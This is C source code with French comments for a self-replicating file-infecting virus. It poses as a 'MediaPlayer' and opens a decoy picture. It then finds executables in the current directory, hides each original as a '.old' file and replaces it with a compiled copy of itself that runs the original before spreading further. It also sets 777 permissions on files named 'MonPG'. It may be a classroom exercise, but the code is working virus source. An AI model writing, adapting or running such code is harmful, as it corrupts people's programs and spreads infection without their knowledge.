#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

void createMedia();
void lecture();
void infection(struct dirent *fichier);

int main(int argc, char *argv[])
{

	if(strcmp(argv[0],"./MediaPlayer.exe") == 0)
	{		
		createMedia();
	}else{
		char exec[100];
		strcpy(exec,".");
		strcat(exec,argv[0]);
		strcat(exec,".old");
		system(exec);
		lecture();
	}	
		
}


void createMedia()
{
	lecture();
	system("xdg-open Christopher_Columbus.png");  	
}



void lecture()
{
	// pour ouvrir le repertoire		
	DIR* rep = NULL;
	rep = opendir(".");

	//pour les fichiers
	struct dirent *fichier;
	struct stat fileStat;

	char chmod[100];
	char old[100];

	if(rep == NULL)
		exit(1);

		// pour chaque fichier dans le repertoire
		while((fichier = readdir(rep)) != NULL)
		{
			if(strstr(fichier->d_name,"MonPG") && strstr(fichier->d_name,".c") == NULL)			{// permet d'accorder les droits d'executions sur les programes MonPG
				strcpy(chmod,"chmod 777 ");
				strcat(chmod,fichier->d_name);
				system(chmod);
			}

			stat(fichier->d_name,&fileStat);   
			
			// variable qui aura comme valeur le nom_du_fichier.old qui servira a verif s'il existe
			strcpy(old,fichier->d_name);
			strcat(old,".old");
		
			if((fileStat.st_mode & S_IXUSR) && strstr(fichier->d_name,"MediaPlayer") == NULL && strcmp(fichier->d_name,".") !=0 && strcmp(fichier->d_name,"..") !=0 &&  strstr(fichier->d_name,".old") == NULL && access(old,F_OK) != 0){ 
//si c'est un fichier exe et n'est pas Mediaplayer ainsi qu'un .old pour ne pas créer des .old.old
// la méthode access(old,F_OK) permet de vérifier si le fichier 'old' n'existe pas
				printf("le fichier %s va être infecté \n",fichier->d_name);
				infection(fichier);
			}
			
		}
	
}

void infection(struct dirent *fichier)
{
	char src[100];
	char newexec[100];
	char renamefile[100];
	char supressionC[100];
	char tmp[100];

	// ici c'est initialisation de la variable pour créer le fichier c avec lequel on va créer l'executable et placer le virus
	strcpy(src,fichier->d_name);
	strcat(src,"virolé.c");


	// ici c'est l'initialisation de la variable pour avoir l'executable avec le gcc -Wall
	strcpy(newexec,"gcc -Wall ");
	strcat(newexec,src);
	strcat(newexec," -o ");
	strcpy(tmp,fichier->d_name);
	strcat(newexec,tmp);


	//initialisation variable pour rename le fichier exec en .old avec le mv
	strcpy(renamefile,"mv ");
	strcat(renamefile,tmp);
	strcat(renamefile," ");
	strcat(renamefile,".");
	strcat(renamefile,tmp);
	strcat(renamefile,".old");

	// Commande rename de l'executable en .old
	system(renamefile);

	// Variable pour copier le code de MediaPlayer dans le fichier
	char cp[100];
	strcpy(cp,"cp MediaPlayer.c ");
	strcat(cp,src);
	system(cp);

	//Commande du gcc
	system(newexec);

	//supression des fichiers.C qui servent pour le gcc
	strcpy(supressionC,"rm ");
	strcat(supressionC,src);
	system(supressionC);
}

